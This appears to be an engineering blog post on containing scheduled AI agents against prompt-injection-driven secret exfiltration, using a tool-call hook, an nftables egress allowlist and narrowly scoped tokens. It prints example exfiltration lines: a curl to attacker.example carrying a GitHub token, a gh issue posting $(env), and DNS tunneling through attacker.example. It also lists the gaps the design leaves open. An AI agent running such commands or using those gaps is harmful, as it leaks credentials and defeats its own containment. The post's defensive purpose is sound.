---
title: "How We Let AI Agents Run Cron Jobs Without Letting Them Exfiltrate Secrets"
seoTitle: "Run AI Agents on Cron Without Exfiltrating Secrets"
date: 2026-06-12
description: "Autonomous agents with shell access and live secrets are an exfiltration surface. Here's the three-layer defense-in-depth we shipped — and an honest account of what it still doesn't stop."
ogImage: "blog/og-ai-agents-cron-without-exfiltrating-secrets.png"
tags:
  - agent-security
  - defense-in-depth
  - egress-firewall
  - autonomous-agents
  - claude-code
---

An autonomous agent running on a schedule is a process with three things at once: shell access, live credentials in its environment, and a prompt it did not write. That combination is the whole security problem. A scheduled agent reads an issue, a webpage, a vendor's API response — any of which can carry an instruction the agent was never meant to follow. If that instruction reaches a shell, the agent can run `curl https://attacker.example/?d=$GH_TOKEN` and the secret is gone before anyone reads a log line.

We run agents this way in production. Crons that publish content, prune stale rules, audit our own architecture, check legal posture, roll up analytics — they wake on a timer, do work, and go back to sleep without a human in the loop. So this was not a hypothetical for us. We had live `spawn("bash")` crons inside our web-platform container that, until recently, could reach any host on the internet with the container's full environment in scope.

This post is how we closed that. Not a product pitch — a threat model and the three independent layers we built against it, each one assuming the other two have already failed. The back half names exactly what this design does *not* stop. Both architecture decision records behind it are public, residuals and all.

## The exfiltration surface, stated plainly

Prompt injection is not exotic. It is [command injection](https://owasp.org/www-community/attacks/Command_Injection) with a language model in the middle: untrusted input reaches a place where it gets interpreted as an instruction, and the instruction reaches a place where it executes. The model is not the vulnerability. The vulnerability is the path from "text the agent read" to "command the shell ran" to "packet that left the box."

Three properties of a scheduled agent make this sharp:

- **It runs unattended.** No human reviews the agent's intermediate steps. A vibe-coded agent loop with a human watching every tool call has a containment layer made of eyeballs. A cron does not.
- **It holds real secrets.** A useful agent needs a GitHub token to file issues, a Sentry DSN to report errors, a database key to read state. Those live in the process environment. `env` dumps all of them.
- **Its input is attacker-reachable.** An issue body, a fetched page, a third-party API response — the agent treats these as data, but a model can be talked into treating data as instructions.

You cannot fix this by making the model "smarter about prompts." Injection resistance is a probabilistic property of a system you do not control, and you are betting credentials on it. The durable fix is structural: assume the model *will* be compromised on a bad day, and bound the blast radius with something that does not depend on the model's judgment.

## The thesis: three layers, each assuming the others fail

Defense-in-depth is an overused phrase, so here is the specific discipline we held ourselves to. Every layer is designed as if the other two are already breached. No layer is allowed to be load-bearing alone. If you can draw a single line from "agent compromised" to "secret exfiltrated" that crosses only one of these controls, the design has failed.

1. **A containment hook** at the tool-call boundary — it decides which commands an agent may run at all, and it keeps every secret-reading command denied.
2. **A default-drop network firewall** scoped to the container — even a command that runs can only talk to an allowlisted set of hosts.
3. **Least-privilege tokens** — even traffic that reaches an allowed host carries a credential scoped so narrowly that the destination cannot do much with it.

Layer one is about *what the agent can run*. Layer two is about *where a running command can connect*. Layer three is about *what a connection can do once it arrives*. An attacker has to defeat all three, and the three fail in uncorrelated ways: a hook bypass is a code path, a firewall hole is a routing fact, a token over-grant is a permissions fact. Walk through them in order.

### Layer 1 — The containment hook: what the agent may run

The first layer sits at the tool-call boundary. Before any shell command executes, a `PreToolUse` hook inspects it against an allowlist. The relevant rule for exfiltration is simple and absolute: **the commands that read secrets stay denied, always.** An agent can be relaxed enough to spawn sub-agents and run skills — `Task`, `Agent`, and `Skill` calls are permitted — while `WebFetch`, `WebSearch`, every `mcp__*` tool, and any newly-introduced tool class stay denied by default. New capability is denied until someone deliberately allows it, not allowed until someone notices it is dangerous.

This relaxation was surgical on purpose. We wanted to restore a couple of audit crons that needed to spawn sub-agents, but every layer that severs a secret-read from the agent's context stayed in place. And because a hook is only as trustworthy as its own integrity, the hook runs a self-test probe at spawn time — if the containment logic does not behave as written, the agent does not get to run. Sub-agent hook inheritance is structurally probed per spawn, because "the parent was contained" is not a proof that the child is.

There is a catch we walked straight into, and it is the reason layer one cannot stand alone: **some crons bypass the hook entirely.** Our live `spawn("bash")` crons fork a shell directly, underneath the tool-call boundary the hook guards. For those processes the hook is not in the path at all. A containment control that a whole class of your workloads structurally evades is exactly why you need a second layer that does not care how the process was started.

### Layer 2 — The egress firewall: where a running command can connect

The second layer stops caring about *what* ran and starts caring about *where it can connect*. It is a default-drop network allowlist: by default, nothing inside the container can reach the network, and a short, explicit list of hosts is the only thing permitted out.

We built it in [nftables](https://wiki.nftables.org/wiki-nftables/index.php/Main_Page), scoped to the container, not the host. A host-level default-drop was off the table — the host carries the application tunnel, log shipping, registry pulls, and the CI deploy path, and blackholing those is a full outage. So the rules live in the [`DOCKER-USER` chain](https://docs.docker.com/engine/network/firewall-iptables/), the placeholder Docker documents for exactly this: "A placeholder for user-defined rules that will be processed before rules in the `DOCKER-FORWARD` and `DOCKER` chains." Docker never flushes `DOCKER-USER`, so a single jump from there into our own rule chain survives daemon restarts, and a boot-persistent service re-asserts it after reboots.

The rule order is first-match-wins, with the drop last: accept [established and related connections](https://wiki.nftables.org/wiki-nftables/index.php/Matching_connection_tracking_stateful_metainformation), accept intra-bridge traffic, pin DNS to the container's own resolvers (off-pin queries are logged and dropped), accept the self-hosted job-runner path, accept the allowlisted host set — then log and drop everything else.

Two design choices in this layer did more work than anything else:

**The allowlist is grep-enumerated from runtime code, never intuited.** The lesson that bit us hardest, stated as a principle: *enumerate from the boundary inward, not from the feature outward.* The firewall's boundary is the whole container — the Next.js application included — not the crons we set out to contain. Our first list enumerated the dozen-odd hosts the crons needed. Grep-enumerating *all* runtime egress found more: the transactional email provider, the waitlist service, the payment and infrastructure validators, the browser-push endpoints, and our own first-party canary targets (live plain-fetch crons dial `soleur.ai`, `app.soleur.ai`, and `api.soleur.ai` *through* the firewall). Miss those and default-drop breaks user-facing flows. The authoritative list — 22 static hosts — comes from `git grep` over the runtime directories, and a drift test pins the exact host count so any new dependency forces a deliberate, evidence-carrying edit. That test ships 101 assertions and runs in CI.

**The IP set re-resolves every minute, atomically.** Allowlisting hostnames against a firewall that matches on IPs means tracking DNS as it rotates. A host-side timer re-resolves every minute — the window *is* the user-facing blast radius of an IP rotation — and applies the change as additive-then-prune inside one atomic [`nft -f`](https://www.netfilter.org/projects/nftables/manpage.html) transaction. It is fail-safe on empty resolution and additive-only when any host fails to resolve, so a transient DNS hiccup can never prune live IPs out from under the running app. It unions the host's view of each hostname with the container's own resolver view — CDN and geo answers diverge per resolver, and the container's answers are the IPs it will actually dial. Each tick also re-asserts the jump and the default-drop and re-runs the loader if it has gone missing, so a mid-life flush self-heals instead of failing open in silence.

One more decision worth naming, because it is a deliberate trade and not an oversight: **at bootstrap, the firewall fails open, loudly.** On a fresh host the loader populates the allowlist *before* installing the default-drop, and if resolution fails it aborts and alarms rather than blackholing the application. We chose availability over containment for the cold-start case — and we made that choice observable rather than silent. Which brings up how this whole layer is watched.

The firewall is applied through an infrastructure-as-code provisioner whose post-apply checks are real. This matters more than it sounds: `nft -f` exits 0 on an inert ruleset, so "the apply succeeded" proves nothing about enforcement. The checks run live positive *and* negative container probes — a host that should be reachable, a host that should be blocked — and the apply fails if enforcement is not actually in place. (The terraform gotcha that made an earlier version of those checks decorative is its own story; the short version is below.)

And it is fail-loud with no SSH in the loop. Kernel drops are counted every tick and posted as a paging alert through our error tracker; the resolve timer posts a heartbeat check-in, so a dead timer surfaces as a missed check-in; an `OnFailure` hook fires an alarm and an email. Both drop classes — generic blocked egress and DNS-exfil attempts — are rate-limit-logged. You find out the firewall is doing something, or has stopped doing something, without logging into the box.

### Layer 3 — Least-privilege tokens: what a connection can do

The third layer assumes the attacker got a packet to an allowed host anyway, and asks: what can the credential on that packet actually do?

The crons that talk to GitHub do not carry a broad personal token. They carry a [fine-grained token](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens) scoped to exactly `contents:read` and `issues:write`, repo-scoped. Pushing code and opening pull requests are denied *at the token layer* — not by a hook, not by a firewall rule, but by the credential itself lacking the permission. An agent that is fully compromised, whose command ran, whose packet reached `api.github.com`, still cannot push to the repository, because the token it holds was never granted that power.

There is a separate, related instance of the same principle elsewhere in the platform. Our Concierge sandbox shipped with a zero-egress network policy — `allowedDomains: []`, no outbound network at all — and we widened it to exactly `github.com` and `api.github.com`, and *only* when an entitled [GitHub App installation token](https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation) was minted for that dispatch. The egress permission is *derived* from the token's presence rather than threaded as an independent flag, so the two dangerous half-states — a token with no egress, egress with no token — are simply not representable. And those installation tokens are short-lived: they expire after an hour and are scoped to the installation's repositories and permissions, so even a leaked token is a small, expiring blast radius. The legacy path that never mints a token keeps the fully-closed posture it was born with.

Three layers, three independent failure modes. To exfiltrate a secret, an attacker now has to get a command past the hook, get its packet past the default-drop, *and* find something worth stealing behind a credential scoped to read code and write issues. That is the design working as intended.

## The honest residuals: what this does not stop

Here is the part most security write-ups skip. A defense-in-depth story is only trustworthy if it names its own gaps, so the architecture decision record for the firewall names four residuals out loud, and we are not going to launder them here. If your threat model is more aggressive than ours, these are the ones to weigh.

**Content-blind on-allowlist egress.** The firewall severs *off*-allowlist egress only. It matches on destination, not on payload. A compromised cron can still run `gh issue create --body "$(env)"` to our *own public repo* over allowlisted `api.github.com` — the firewall sees a permitted destination and waves it through. What bounds this is the *other* layers: the containment hook keeps secret-reads denied for the hooked crons, so the body cannot contain a secret in the first place; and the narrowed token bounds any incident to a single user's tenancy. The structural close for the bypass-the-hook spawn-bash crons is a further isolation layer, which we have deferred and tracked rather than pretended away.

**DNS tunneling through the pinned resolver.** Pinning DNS to the container's own resolver blocks dialing an *arbitrary* resolver. It does not block tunneling *through* the legitimate one. A compromised process can encode bytes into the labels of a query like `<base32-payload>.attacker.example` that the legitimate recursive resolver dutifully delivers to the attacker's authoritative name server. It is low-bandwidth and every off-pin attempt is logged, but the on-pin channel is open. Closing it needs a filtering resolver, which is the next escalation if evidence ever demands it.

**CDN shared-IP broadening.** Acceptance is by destination IPv4 with no SNI or Host filtering. Several allowlisted hosts are CDN-fronted on shared anycast ranges — one CDN serves `github.com`, another fronts other hosts. So the *truly reachable* host set is larger than the named allowlist: any host that happens to be co-resident on an allowlisted CDN IP is reachable too. The 22-host list is a floor on what is reachable, not a ceiling.

**DoH on 443.** Related to the above: an allowlisted IP that also serves DNS-over-HTTPS is reachable on port 443 regardless of the port-53 DNS pin. The pin guards 53; it does not guard a DoH endpoint riding 443 on an IP we already allow.

We did not discover these gaps under pressure. We named them in the design review and shipped anyway, because the alternative — a standing SNI-aware proxy in the path — is a single point of failure whose failure mode is "every cron goes dark." The IP-rotation race we *do* accept is fail-loud and self-correcting; a proxy outage is neither. Escalate to the heavier control only on observed production churn, not on a whiteboard worry. All four residuals concentrate on the spawn-bash crons that bypass the hook; the hook-contained crons keep the secret-read severance that makes content-blind egress harmless.

## What we restored, and what stayed deferred

Honest scope cuts the other way too. The point of all this containment was to safely turn workloads *back on*, and we turned on fewer than we could have.

Of the spawn-bash crons that needed restoring, **two came back** under the narrowed `issues:write` token — an architecture self-audit and a legal-posture audit, both of which only need to read the repo and file issues. The other nine stayed deferred, deliberately. Six of them drive pull-request flows that need per-construct allowlist refinement before they are safe to run unattended. Three more — a bug-fixer, a community monitor, a UX auditor — depend on non-GitHub egress that the firewall has to mediate, so they stay firewall-dependent and off until that path is hardened. We could have flipped them all on and called the project done. We restored the two we could prove were contained and wrote down why the rest wait.

## The terraform gotcha worth its own paragraph

One finding from the review earned its own line in the learnings, because it is a trap anyone wiring assertions into infrastructure can fall into. A terraform `remote-exec` provisioner joins its `inline` commands into a *single* shell script with no implicit `set -e`. The provisioner fails only on the *last* command's exit status. Our enforcement probes — "is the ruleset actually present, does the negative case actually drop" — all ran *before* an unconditional final command, which meant an inert, non-enforcing ruleset would have applied bright green. The assertions existed, ran, and were structurally incapable of failing the thing they claimed to gate. Five of the review agents independently flagged it. The fix is unglamorous: `set -e` as the first inline element, and every probe written as an explicit `if cmd; then echo FAILED; exit 1; fi`. The lesson generalizes past terraform: a guard that cannot fail is worse than no guard, because it converts "unverified" into "verified-looking."

## The open part

The thing we are proudest of is not the firewall. It is that the threat model is public — residuals, deferrals, and the terraform trap included. Security designs that only publish their wins are asking you to trust the parts they did not show. We would rather show the parts that do not close yet and let you judge the whole picture.

If you run autonomous agents anywhere near production credentials, the structure transfers directly: a containment hook at the tool boundary, a default-drop egress allowlist enumerated from the boundary inward, and credentials scoped so narrowly that reaching the destination is not the same as being able to use it. Build each layer as if the others have already failed. Then write down, in public, the lines an attacker could still draw.

The full firewall design, the rule order, and all four named residuals live in **ADR-052** in our repository. The least-privilege token-derived egress layer is **ADR-051**. Both are in the open knowledge base. Read the threat model, find a line we missed, and tell us — that is the build-in-public bargain, and it is the only kind of security claim worth making.

## Frequently Asked Questions

### Why not just trust the model to resist prompt injection?

Injection resistance is a probabilistic property of a system you do not control, and you would be betting live credentials on it. A durable design assumes the model will be compromised on a bad day and bounds the blast radius with controls that do not depend on the model's judgment — a network that drops by default, tokens scoped to almost nothing, a hook that denies secret-reads regardless of what the model decides to do.

### What is the DOCKER-USER chain and why use it?

`DOCKER-USER` is a chain Docker provides for user-defined firewall rules that are evaluated before Docker's own rules, and that Docker never flushes — so the rules survive daemon restarts. Scoping a default-drop egress allowlist there contains the container without touching the host's own traffic (the application tunnel, log shipping, registry pulls), where a default-drop would cause a full outage.

### Does a container egress firewall stop all data exfiltration?

No, and the design says so. It matches on destination IP, not payload, so a compromised process can still send data to an *allowlisted* host (content-blind egress), tunnel low-bandwidth data through the pinned DNS resolver, reach hosts co-resident on an allowlisted CDN IP, or hit a DoH endpoint on port 443. It severs off-allowlist egress; the other layers — a secret-read-denying hook and narrowly-scoped tokens — bound what an on-allowlist channel can actually leak.

### Why re-resolve the allowlist every minute?

The firewall matches on IPs, but the allowlist is written as hostnames whose IPs rotate. A one-minute re-resolve timer keeps the IP set current; the interval is short because that window is the user-facing blast radius of an IP rotation. The update is applied atomically (additive-then-prune in one transaction) and is additive-only on partial resolution failure, so a transient DNS error can never prune live IPs out from under the running app.

### How do least-privilege tokens add a layer the firewall does not?

The firewall controls *where* a packet can go; the token controls *what it can do once it arrives*. A cron's GitHub token is scoped to `contents:read` and `issues:write` only, so even a fully compromised agent whose packet reaches `api.github.com` cannot push code or open pull requests — the credential simply lacks the permission. Installation tokens compound this by being short-lived and installation-scoped, so a leaked token is a small, expiring blast radius.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "Why not just trust the model to resist prompt injection?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Injection resistance is a probabilistic property of a system you do not control, and you would be betting live credentials on it. A durable design assumes the model will be compromised and bounds the blast radius with controls that do not depend on the model's judgment: a network that drops by default, tokens scoped to almost nothing, and a hook that denies secret-reads regardless of what the model decides to do."
      }
    },
    {
      "@type": "Question",
      "name": "What is the DOCKER-USER chain and why use it?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "DOCKER-USER is a chain Docker provides for user-defined firewall rules that are evaluated before Docker's own rules and that Docker never flushes, so the rules survive daemon restarts. Scoping a default-drop egress allowlist there contains the container without touching the host's own traffic, where a default-drop would cause a full outage."
      }
    },
    {
      "@type": "Question",
      "name": "Does a container egress firewall stop all data exfiltration?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "No. It matches on destination IP, not payload, so a compromised process can still send data to an allowlisted host, tunnel low-bandwidth data through the pinned DNS resolver, reach hosts co-resident on an allowlisted CDN IP, or hit a DoH endpoint on port 443. It severs off-allowlist egress; the other layers, a secret-read-denying hook and narrowly-scoped tokens, bound what an on-allowlist channel can actually leak."
      }
    },
    {
      "@type": "Question",
      "name": "Why re-resolve the allowlist every minute?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The firewall matches on IPs, but the allowlist is written as hostnames whose IPs rotate. A one-minute re-resolve timer keeps the IP set current; the interval is short because that window is the user-facing blast radius of an IP rotation. The update is applied atomically and is additive-only on partial resolution failure, so a transient DNS error can never prune live IPs out from under the running app."
      }
    },
    {
      "@type": "Question",
      "name": "How do least-privilege tokens add a layer the firewall does not?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The firewall controls where a packet can go; the token controls what it can do once it arrives. A cron's GitHub token is scoped to contents:read and issues:write only, so even a fully compromised agent whose packet reaches api.github.com cannot push code or open pull requests. Installation tokens compound this by being short-lived and installation-scoped, so a leaked token is a small, expiring blast radius."
      }
    }
  ]
}
</script>
